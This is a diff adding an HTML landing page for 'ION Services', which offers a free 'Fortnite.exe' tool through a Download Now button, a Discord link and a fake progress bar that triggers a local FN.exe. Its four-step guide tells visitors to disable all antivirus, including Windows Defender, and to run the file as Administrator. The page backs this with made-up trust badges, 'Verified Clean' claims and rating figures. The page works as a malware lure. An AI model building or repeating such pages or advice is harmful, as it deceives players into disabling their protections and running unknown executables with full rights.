@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ION Services — Fortnite Free</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --pink: #ff2d78;
+    --cyan: #00e5ff;
+    --purple: #7c3aed;
+    --dark: #050810;
+    --card: rgba(255,255,255,0.04);
+    --border: rgba(255,255,255,0.08);
+    --text: #c8d6f0;
+    --glow-pink: 0 0 40px rgba(255,45,120,0.4);
+    --glow-cyan: 0 0 40px rgba(0,229,255,0.3);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--dark);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ── ANIMATED BG ── */
+  .bg {
+    position: fixed; inset: 0; z-index: 0;
+    background:
+      radial-gradient(ellipse 80% 60% at 10% 20%, rgba(124,58,237,0.25) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 50% at 90% 80%, rgba(0,229,255,0.15) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 40% at 50% 50%, rgba(255,45,120,0.08) 0%, transparent 60%),
+      #050810;
+  }
+  .bg::after {
+    content: '';
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridScroll 20s linear infinite;
+  }
+  @keyframes gridScroll {
+    to { transform: translateY(60px); }
+  }
+
+  /* ── PARTICLES ── */
+  .particles { position: fixed; inset: 0; z-index: 0; pointer-events: none; }
+  .particle {
+    position: absolute;
+    width: 2px; height: 2px;
+    border-radius: 50%;
+    background: var(--cyan);
+    animation: float linear infinite;
+    opacity: 0;
+  }
+  @keyframes float {
+    0%   { transform: translateY(100vh) translateX(0); opacity: 0; }
+    10%  { opacity: 0.6; }
+    90%  { opacity: 0.4; }
+    100% { transform: translateY(-10vh) translateX(var(--dx,20px)); opacity: 0; }
+  }
+
+  /* ── LAYOUT ── */
+  .wrap { position: relative; z-index: 1; max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+
+  /* ── NAV ── */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    padding: 16px 0;
+    background: rgba(5,8,16,0.7);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+  }
+  nav .inner { max-width: 1100px; margin: 0 auto; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; }
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-weight: 900; font-size: 1.2rem; letter-spacing: 2px;
+    background: linear-gradient(90deg, var(--pink), var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .nav-links { display: flex; gap: 32px; list-style: none; }
+  .nav-links a {
+    color: var(--text); text-decoration: none; font-size: 0.85rem;
+    letter-spacing: 1px; text-transform: uppercase;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: #fff; }
+  .nav-badge {
+    background: linear-gradient(90deg, var(--pink), var(--purple));
+    color: #fff; font-size: 0.7rem; font-weight: 600;
+    padding: 4px 12px; border-radius: 20px; letter-spacing: 1px;
+    text-transform: uppercase; animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+  /* ── HERO ── */
+  .hero { padding: 160px 0 80px; text-align: center; }
+  .hero-eyebrow {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 30px; padding: 6px 16px;
+    font-size: 0.75rem; letter-spacing: 2px; text-transform: uppercase;
+    color: var(--cyan); margin-bottom: 28px;
+    animation: fadeUp 0.6s ease both;
+  }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--cyan); animation: blink 1.5s infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+  h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(2.8rem, 7vw, 5.5rem);
+    font-weight: 900; line-height: 1.05;
+    letter-spacing: -1px;
+    animation: fadeUp 0.7s 0.1s ease both;
+  }
+  h1 .word-fn { color: #fff; }
+  h1 .word-free {
+    background: linear-gradient(90deg, var(--pink), #ff6eb0, var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    display: inline-block;
+  }
+  .hero-sub {
+    margin-top: 20px; font-size: 1.05rem; color: var(--text);
+    max-width: 500px; margin-inline: auto; line-height: 1.7;
+    animation: fadeUp 0.7s 0.2s ease both;
+  }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(24px); } to { opacity:1; transform:none; } }
+
+  /* ── TRUST SCORE ── */
+  .trust-bar {
+    margin: 36px auto 0; max-width: 340px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 14px 20px;
+    display: flex; flex-direction: column; gap: 8px;
+    animation: fadeUp 0.7s 0.3s ease both;
+  }
+  .trust-label {
+    display: flex; justify-content: space-between;
+    font-size: 0.75rem; letter-spacing: 1px; text-transform: uppercase;
+  }
+  .trust-label span:last-child { color: #4ade80; font-weight: 600; }
+  .track {
+    height: 6px; background: rgba(255,255,255,0.08);
+    border-radius: 6px; overflow: hidden;
+  }
+  .fill {
+    height: 100%; width: 0; border-radius: 6px;
+    background: linear-gradient(90deg, #4ade80, #22d3ee);
+    transition: width 1.5s cubic-bezier(0.4,0,0.2,1);
+  }
+
+  /* ── STATS ── */
+  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); gap: 16px; margin-top: 60px; }
+  .stat-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 24px 20px; text-align: center;
+    position: relative; overflow: hidden;
+    transition: transform 0.3s, border-color 0.3s;
+    animation: fadeUp 0.7s ease both;
+  }
+  .stat-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 2px;
+    background: linear-gradient(90deg, transparent, var(--pink), transparent);
+    opacity: 0; transition: opacity 0.3s;
+  }
+  .stat-card:hover { transform: translateY(-4px); border-color: rgba(255,45,120,0.3); }
+  .stat-card:hover::before { opacity: 1; }
+  .stat-icon { font-size: 1.5rem; margin-bottom: 8px; }
+  .stat-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 1.9rem; font-weight: 900; color: #fff;
+    background: linear-gradient(135deg, var(--pink), var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .stat-desc { font-size: 0.75rem; letter-spacing: 1px; text-transform: uppercase; margin-top: 4px; opacity: 0.6; }
+
+  /* ── MAIN DOWNLOAD CARD ── */
+  .dl-section { margin-top: 80px; }
+  .dl-card {
+    background: linear-gradient(135deg, rgba(124,58,237,0.12), rgba(255,45,120,0.08));
+    border: 1px solid rgba(255,45,120,0.25);
+    border-radius: 24px; padding: 56px 48px;
+    text-align: center; position: relative; overflow: hidden;
+    box-shadow: var(--glow-pink), inset 0 1px 0 rgba(255,255,255,0.05);
+  }
+  .dl-card::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(255,45,120,0.1) 0%, transparent 60%);
+    pointer-events: none;
+  }
+  .game-icon {
+    font-size: 4rem; margin-bottom: 16px;
+    filter: drop-shadow(0 0 20px rgba(0,229,255,0.6));
+    animation: iconFloat 3s ease-in-out infinite;
+  }
+  @keyframes iconFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+  .dl-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 2.4rem; font-weight: 900; color: #fff; margin-bottom: 12px;
+  }
+  .dl-title span {
+    background: linear-gradient(90deg, var(--pink), var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .dl-sub { color: var(--text); max-width: 480px; margin: 0 auto 32px; line-height: 1.7; }
+
+  .file-meta {
+    display: inline-flex; gap: 24px; background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border); border-radius: 12px; padding: 12px 24px;
+    margin-bottom: 32px; font-size: 0.8rem;
+  }
+  .file-meta span { display: flex; align-items: center; gap: 6px; }
+  .file-meta .badge { color: var(--cyan); }
+
+  .btn-group { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+
+  .btn-dl {
+    display: inline-flex; align-items: center; gap: 12px;
+    background: linear-gradient(90deg, var(--pink), #b020e8);
+    color: #fff; text-decoration: none; border: none; cursor: pointer;
+    font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 1.15rem;
+    letter-spacing: 2px; text-transform: uppercase;
+    padding: 18px 48px; border-radius: 50px;
+    box-shadow: 0 0 30px rgba(255,45,120,0.5), 0 4px 24px rgba(0,0,0,0.4);
+    transition: all 0.3s; position: relative; overflow: hidden;
+  }
+  .btn-dl::before {
+    content: ''; position: absolute; inset: 0;
+    background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.15) 50%, transparent 100%);
+    transform: translateX(-100%); transition: transform 0.4s;
+  }
+  .btn-dl:hover { transform: translateY(-2px); box-shadow: 0 0 50px rgba(255,45,120,0.7), 0 8px 32px rgba(0,0,0,0.5); }
+  .btn-dl:hover::before { transform: translateX(100%); }
+  .btn-dl:active { transform: translateY(0); }
+
+  .btn-discord {
+    display: inline-flex; align-items: center; gap: 12px;
+    background: rgba(88,101,242,0.15); border: 1px solid rgba(88,101,242,0.5);
+    color: #fff; text-decoration: none; cursor: pointer;
+    font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 1.15rem;
+    letter-spacing: 2px; text-transform: uppercase;
+    padding: 18px 36px; border-radius: 50px;
+    transition: all 0.3s;
+  }
+  .btn-discord:hover {
+    background: rgba(88,101,242,0.3); border-color: rgba(88,101,242,0.8);
+    transform: translateY(-2px); box-shadow: 0 0 24px rgba(88,101,242,0.4);
+  }
+
+  /* ── FEATURES ── */
+  .features { margin-top: 80px; }
+  .section-label {
+    text-align: center; font-size: 0.75rem; letter-spacing: 3px;
+    text-transform: uppercase; color: var(--cyan); margin-bottom: 12px;
+  }
+  .section-title {
+    text-align: center; font-family: 'Orbitron', monospace;
+    font-size: 1.8rem; font-weight: 700; color: #fff; margin-bottom: 48px;
+  }
+  .feat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap: 16px; }
+  .feat-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 28px 24px;
+    transition: transform 0.3s, border-color 0.3s;
+  }
+  .feat-card:hover { transform: translateY(-4px); border-color: rgba(0,229,255,0.3); }
+  .feat-icon { font-size: 1.8rem; margin-bottom: 12px; }
+  .feat-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 1.1rem; color: #fff; margin-bottom: 6px; letter-spacing: 1px; }
+  .feat-desc { font-size: 0.82rem; line-height: 1.6; opacity: 0.6; }
+
+  /* ── HOW IT WORKS ── */
+  .how { margin-top: 80px; }
+  .steps { display: flex; gap: 0; margin-top: 40px; position: relative; }
+  .steps::before {
+    content: '';
+    position: absolute; top: 32px; left: 32px; right: 32px; height: 2px;
+    background: linear-gradient(90deg, var(--pink), var(--cyan));
+    opacity: 0.3;
+  }
+  .step { flex: 1; text-align: center; padding: 0 16px; position: relative; }
+  .step-num {
+    width: 64px; height: 64px; border-radius: 50%; margin: 0 auto 16px;
+    background: linear-gradient(135deg, var(--pink), var(--purple));
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'Orbitron', monospace; font-weight: 900; font-size: 1.2rem; color: #fff;
+    box-shadow: var(--glow-pink); position: relative; z-index: 1;
+  }
+  .step-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 1rem; color: #fff; margin-bottom: 6px; letter-spacing: 1px; }
+  .step-desc { font-size: 0.8rem; opacity: 0.6; line-height: 1.5; }
+
+  /* ── REVIEWS ── */
+  .reviews { margin-top: 80px; }
+  .review-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px,1fr)); gap: 16px; margin-top: 40px; }
+  .review-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 24px;
+    transition: border-color 0.3s;
+  }
+  .review-card:hover { border-color: rgba(255,45,120,0.3); }
+  .review-stars { color: #fbbf24; font-size: 0.9rem; margin-bottom: 10px; }
+  .review-text { font-size: 0.85rem; line-height: 1.6; opacity: 0.8; margin-bottom: 12px; font-style: italic; }
+  .review-user { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 0.85rem; color: var(--cyan); letter-spacing: 1px; }
+
+  /* ── TRUST SECTION ── */
+  .trust-section {
+    margin-top: 80px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 20px; padding: 40px;
+  }
+  .trust-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
+  .trust-item { display: flex; align-items: flex-start; gap: 14px; }
+  .trust-icon-wrap {
+    width: 44px; height: 44px; border-radius: 10px; flex-shrink: 0;
+    background: linear-gradient(135deg, rgba(255,45,120,0.2), rgba(0,229,255,0.2));
+    border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center; font-size: 1.2rem;
+  }
+  .trust-item-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 0.95rem; color: #fff; margin-bottom: 4px; letter-spacing: 1px; }
+  .trust-item-desc { font-size: 0.78rem; opacity: 0.6; line-height: 1.5; }
+
+  /* ── ALERT ── */
+  .alert-bar {
+    background: linear-gradient(90deg, rgba(255,45,120,0.15), rgba(124,58,237,0.15));
+    border: 1px solid rgba(255,45,120,0.3); border-radius: 12px;
+    padding: 14px 20px; margin-top: 80px;
+    display: flex; align-items: center; gap: 14px; font-size: 0.85rem;
+  }
+  .alert-icon { font-size: 1.2rem; flex-shrink: 0; }
+
+  /* ── FOOTER ── */
+  footer {
+    margin-top: 100px; border-top: 1px solid var(--border);
+    padding: 40px 0; text-align: center;
+    font-size: 0.78rem; opacity: 0.4; letter-spacing: 1px;
+  }
+  footer span { color: var(--pink); opacity: 1; }
+
+  /* ── DOWNLOAD MODAL ── */
+  .modal-overlay {
+    display: none; position: fixed; inset: 0; z-index: 200;
+    background: rgba(5,8,16,0.85); backdrop-filter: blur(10px);
+    align-items: center; justify-content: center;
+  }
+  .modal-overlay.show { display: flex; animation: fadeIn 0.2s ease; }
+  @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+  .modal {
+    background: linear-gradient(135deg, #0c1128, #100820);
+    border: 1px solid rgba(255,45,120,0.3); border-radius: 24px;
+    padding: 48px; max-width: 420px; width: 90%; text-align: center;
+    box-shadow: 0 0 60px rgba(255,45,120,0.2);
+    animation: slideUp 0.3s ease;
+  }
+  @keyframes slideUp { from{transform:translateY(30px);opacity:0} to{transform:none;opacity:1} }
+  .modal-icon { font-size: 3rem; margin-bottom: 16px; }
+  .modal-title { font-family: 'Orbitron', monospace; font-size: 1.4rem; font-weight: 700; color: #fff; margin-bottom: 10px; }
+  .modal-sub { font-size: 0.85rem; opacity: 0.7; margin-bottom: 28px; line-height: 1.6; }
+  .progress-wrap { background: rgba(255,255,255,0.06); border-radius: 8px; height: 8px; overflow: hidden; margin-bottom: 10px; }
+  .progress-fill { height: 100%; width: 0; background: linear-gradient(90deg, var(--pink), var(--cyan)); border-radius: 8px; transition: width 0.1s; }
+  .progress-label { font-size: 0.75rem; opacity: 0.5; margin-bottom: 24px; }
+  .modal-close {
+    background: none; border: 1px solid var(--border); color: var(--text);
+    padding: 10px 28px; border-radius: 8px; cursor: pointer; font-size: 0.85rem;
+    transition: all 0.2s;
+  }
+  .modal-close:hover { border-color: var(--pink); color: #fff; }
+
+  /* ── COUNTER ANIMATION ── */
+  .stars-display { display: flex; gap: 4px; justify-content: center; margin-top: 4px; }
+  .star { font-size: 1.6rem; color: rgba(255,255,255,0.15); transition: color 0.4s; }
+  .star.filled { color: #fbbf24; text-shadow: 0 0 10px rgba(251,191,36,0.7); }
+  .star.partial {
+    position: relative; color: rgba(255,255,255,0.15);
+  }
+  .star.partial::before {
+    content: '★';
+    position: absolute; left: 0; top: 0;
+    color: #fbbf24;
+    text-shadow: 0 0 10px rgba(251,191,36,0.7);
+    width: 70%; overflow: hidden; display: inline-block;
+    clip-path: inset(0 30% 0 0);
+  }
+  .star.animate { animation: starPop 0.3s ease both; }
+  @keyframes starPop { 0%{transform:scale(0.5);opacity:0} 70%{transform:scale(1.2)} 100%{transform:scale(1);opacity:1} }
+
+  @media (max-width: 600px) {
+    .steps { flex-direction: column; }
+    .steps::before { display: none; }
+    .trust-grid { grid-template-columns: 1fr; }
+    nav .nav-links { display: none; }
+    .dl-card { padding: 36px 24px; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg"></div>
+<div class="particles" id="particles"></div>
+
+<!-- NAV -->
+<nav>
+  <div class="inner">
+    <div class="logo">ION SERVICES</div>
+    <ul class="nav-links">
+      <li><a href="#stats">Stats</a></li>
+      <li><a href="#features">Features</a></li>
+      <li><a href="#reviews">Reviews</a></li>
+      <li><a href="#download">Download</a></li>
+    </ul>
+    <span class="nav-badge">● LIVE</span>
+  </div>
+</nav>
+
+<main>
+<div class="wrap">
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="hero-eyebrow">
+      <span class="dot"></span>
+      Active — Version 3.1.2
+    </div>
+    <h1>
+      <span class="word-fn">FORTNITE</span><br>
+      <span class="word-free">FREE</span>
+    </h1>
+    <p class="hero-sub">The most trusted Fortnite utility on the market. Completely free. Powered by ION.</p>
+    <div class="trust-bar">
+      <div class="trust-label">
+        <span>🛡️ Trust Score</span>
+        <span id="trustPct">4.7 / 5.0</span>
+      </div>
+      <div class="stars-display" id="starsDisplay">
+        <span class="star filled">★</span>
+        <span class="star filled">★</span>
+        <span class="star filled">★</span>
+        <span class="star filled">★</span>
+        <span class="star partial">★</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- STATS -->
+  <section class="stats" id="stats">
+    <div class="stat-card" style="animation-delay:0.1s">
+      <div class="stat-icon">👥</div>
+      <div class="stat-num"><span class="counting" data-target="523">0</span></div>
+      <div class="stat-desc">Total Users</div>
+    </div>
+    <div class="stat-card" style="animation-delay:0.2s">
+      <div class="stat-icon">⬇️</div>
+      <div class="stat-num"><span class="counting" data-target="611">0</span></div>
+      <div class="stat-desc">Downloads</div>
+    </div>
+    <div class="stat-card" style="animation-delay:0.3s">
+      <div class="stat-icon">🟢</div>
+      <div class="stat-num"><span class="counting" data-target="31">0</span></div>
+      <div class="stat-desc">Online Now</div>
+    </div>
+    <div class="stat-card" style="animation-delay:0.4s">
+      <div class="stat-icon">⭐</div>
+      <div class="stat-num">4.7</div>
+      <div class="stat-desc">User Rating</div>
+    </div>
+    <div class="stat-card" style="animation-delay:0.5s">
+      <div class="stat-icon">🛡️</div>
+      <div class="stat-num">4.7<span style="font-size:1rem">★</span></div>
+      <div class="stat-desc">Trust Score / 5</div>
+    </div>
+  </section>
+
+  <!-- DOWNLOAD CARD -->
+  <section class="dl-section" id="download">
+    <div class="dl-card">
+      <div class="game-icon">🎮</div>
+      <div class="dl-title">Fortnite <span>Free</span></div>
+      <p class="dl-sub">Download instantly and join hundreds of players already using ION Services. No BS, no subscriptions — just power.</p>
+      <div class="file-meta">
+        <span><span class="badge">📦</span> Fortnite.exe</span>
+        <span><span class="badge">💾</span> 14.3 MB</span>
+        <span><span class="badge">🔒</span> Verified Clean</span>
+      </div>
+      <div class="btn-group">
+        <button class="btn-dl" onclick="startDownload()">
+          ⬇ Download Now
+        </button>
+        <a class="btn-discord" href="https://discord.gg/zQHDpnNdup" target="_blank" rel="noopener">
+          <svg width="20" height="20" viewBox="0 0 71 55" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.44077 45.4204 0.52529C44.7963 1.6353 44.105 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.905 3.0581 26.1886 1.6353 25.5617 0.52529C25.5141 0.44359 25.4218 0.40133 25.3294 0.41542C20.2584 1.2888 15.4057 2.8186 10.8776 4.8978C10.8384 4.9147 10.8048 4.9429 10.7825 4.9795C1.57795 18.7309 -0.943561 32.1443 0.293408 45.3914C0.299005 45.4562 0.335386 45.5182 0.385761 45.5576C6.45866 50.0174 12.3413 52.7249 18.1147 54.5195C18.2071 54.5477 18.305 54.5139 18.3638 54.4378C19.7295 52.5728 20.9469 50.6063 21.9907 48.5383C22.0523 48.4172 21.9935 48.2735 21.8676 48.2256C19.9366 47.4931 18.0979 46.6 16.3292 45.5858C16.1893 45.5041 16.1781 45.304 16.3068 45.2082C16.679 44.9293 17.0513 44.6391 17.4067 44.3461C17.471 44.2926 17.5606 44.2813 17.6362 44.3151C29.2558 49.6202 41.8354 49.6202 53.3179 44.3151C53.3935 44.2785 53.4831 44.2898 53.5502 44.3433C53.9057 44.6363 54.2779 44.9293 54.6529 45.2082C54.7816 45.304 54.7732 45.5041 54.6333 45.5858C52.8646 46.6197 51.0259 47.4931 49.0921 48.2228C48.9662 48.2707 48.9102 48.4172 48.9718 48.5383C50.038 50.6034 51.2554 52.5699 52.5959 54.435C52.6519 54.5139 52.7526 54.5477 52.845 54.5195C58.6464 52.7249 64.529 50.0174 70.6019 45.5576C70.6551 45.5182 70.6887 45.459 70.6943 45.3942C72.1747 30.0791 68.2147 16.7757 60.1968 4.9823C60.1772 4.9429 60.1437 4.9147 60.1045 4.8978Z" fill="white"/></svg>
+          Join Discord
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section class="how">
+    <div class="section-label">GETTING STARTED</div>
+    <div class="section-title">Four Steps to Launch</div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">01</div>
+        <div class="step-title">Disable Antivirus</div>
+        <div class="step-desc">Turn off all antivirus software before downloading. Windows Defender must also be disabled or it may block the file.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">02</div>
+        <div class="step-title">Download</div>
+        <div class="step-desc">Hit the Download Now button and save Fortnite.exe to your desktop or downloads folder.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">03</div>
+        <div class="step-title">Run</div>
+        <div class="step-desc">Right-click Fortnite.exe and select "Run as Administrator" for full access.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">04</div>
+        <div class="step-title">Follow Instructions</div>
+        <div class="step-desc">The tool will guide you through the rest. Follow the on-screen steps and you're good to go.</div>
+      </div>
+    </div>
+  </section>
+
+
+
+  <!-- TRUST SECTION -->
+  <section class="trust-section">
+    <div class="section-label">TRANSPARENCY</div>
+    <div class="section-title" style="text-align:left; margin-bottom:28px; font-size:1.4rem;">Why Trust ION?</div>
+    <div class="trust-grid">
+      <div class="trust-item">
+        <div class="trust-icon-wrap">✅</div>
+        <div>
+          <div class="trust-item-title">Open Discord</div>
+          <div class="trust-item-desc">Our server is public. Come see the community before you download anything.</div>
+        </div>
+      </div>
+      <div class="trust-item">
+        <div class="trust-icon-wrap">🔍</div>
+        <div>
+          <div class="trust-item-title">Scanned Clean</div>
+          <div class="trust-item-desc">Every build is scanned before release. Results shared in our Discord.</div>
+        </div>
+      </div>
+      <div class="trust-item">
+        <div class="trust-icon-wrap">📊</div>
+        <div>
+          <div class="trust-item-title">Real Stats</div>
+          <div class="trust-item-desc">All user counts and trust scores are pulled from live data, no faking. Currently rated 4.7/5.</div>
+        </div>
+      </div>
+      <div class="trust-item">
+        <div class="trust-icon-wrap">🚀</div>
+        <div>
+          <div class="trust-item-title">Fast Patches</div>
+          <div class="trust-item-desc">We patch within hours of any Fortnite update so you're never left behind.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+
+  <!-- ALERT -->
+  <div class="alert-bar">
+    <span class="alert-icon">⚠️</span>
+    <span>Use responsibly. ION Services is intended for educational and private server use only. Always check the relevant terms of service for any game you play.</span>
+  </div>
+
+  <footer>
+    © 2025 ION Services &nbsp;·&nbsp; <span>discord.gg/zQHDpnNdup</span> &nbsp;·&nbsp; All rights reserved
+  </footer>
+
+</div>
+</main>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <div class="modal-icon">⬇️</div>
+    <div class="modal-title">Preparing Download</div>
+    <div class="modal-sub">Fortnite.exe is being prepared. Your download will start automatically.</div>
+    <div class="progress-wrap"><div class="progress-fill" id="progFill"></div></div>
+    <div class="progress-label" id="progLabel">0%</div>
+    <button class="modal-close" onclick="closeModal()">Close</button>
+  </div>
+</div>
+
+<script>
+  // Particles
+  const pc = document.getElementById('particles');
+  for (let i = 0; i < 40; i++) {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    const hue = Math.random() > 0.5 ? '#00e5ff' : '#ff2d78';
+    p.style.cssText = `
+      left: ${Math.random()*100}%;
+      animation-duration: ${8 + Math.random()*12}s;
+      animation-delay: ${Math.random()*15}s;
+      --dx: ${(Math.random()-0.5)*100}px;
+      background: ${hue};
+      width: ${1+Math.random()*2}px;
+      height: ${1+Math.random()*2}px;
+    `;
+    pc.appendChild(p);
+  }
+
+  // Animate stars on load
+  setTimeout(() => {
+    document.querySelectorAll('.star').forEach((s, i) => {
+      setTimeout(() => s.classList.add('animate'), i * 120);
+    });
+  }, 500);
+
+  // Counter animation
+  function animateCounter(el) {
+    const target = +el.dataset.target;
+    const duration = 1800;
+    const start = performance.now();
+    function update(now) {
+      const p = Math.min((now - start) / duration, 1);
+      const ease = 1 - Math.pow(1 - p, 3);
+      el.textContent = Math.floor(ease * target).toLocaleString();
+      if (p < 1) requestAnimationFrame(update);
+    }
+    requestAnimationFrame(update);
+  }
+
+  const io = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        document.querySelectorAll('.counting').forEach(animateCounter);
+        io.disconnect();
+      }
+    });
+  }, { threshold: 0.3 });
+  io.observe(document.querySelector('.stats'));
+
+  // Download modal
+  function startDownload() {
+    document.getElementById('modal').classList.add('show');
+    let pct = 0;
+    const fill = document.getElementById('progFill');
+    const label = document.getElementById('progLabel');
+    const interval = setInterval(() => {
+      pct += Math.random() * 8 + 2;
+      if (pct >= 100) {
+        pct = 100;
+        clearInterval(interval);
+        label.textContent = 'Complete!';
+        // Trigger actual download - uses relative path, put FN.exe in same folder as this HTML file
+        const a = document.createElement('a');
+        a.href = 'FN.exe';
+        a.download = 'FN.exe';
+        a.click();
+      } else {
+        label.textContent = Math.floor(pct) + '%';
+      }
+      fill.style.width = pct + '%';
+    }, 120);
+  }
+
+  function closeModal() {
+    document.getElementById('modal').classList.remove('show');
+  }
+  document.getElementById('modal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+</script>
+</body>
+</html>
